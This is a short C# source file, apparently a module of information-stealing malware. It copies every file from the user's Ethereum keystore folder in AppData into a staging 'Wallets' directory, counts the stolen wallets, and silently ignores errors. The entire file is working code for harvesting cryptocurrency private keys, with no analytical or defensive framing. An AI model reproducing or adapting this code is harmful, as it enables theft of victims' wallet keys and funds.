using System.IO;

namespace SHARP
{
    internal class Ethereum
    {
      public static string EthereumDir = "\\Wallets\\Ethereum\\";

      public static void EcoinStr(string directorypath)
      {
        try
        {
          foreach (FileInfo file in new DirectoryInfo(Help.AppData + "\\Ethereum\\keystore").GetFiles())
          {
            Directory.CreateDirectory(directorypath + Ethereum.EthereumDir);
            file.CopyTo(directorypath + Ethereum.EthereumDir + file.Name);
          }
          ++Counting.etherium;
          ++Counting.Wallets;
        }
        catch
        {
        }
      }
    }
}
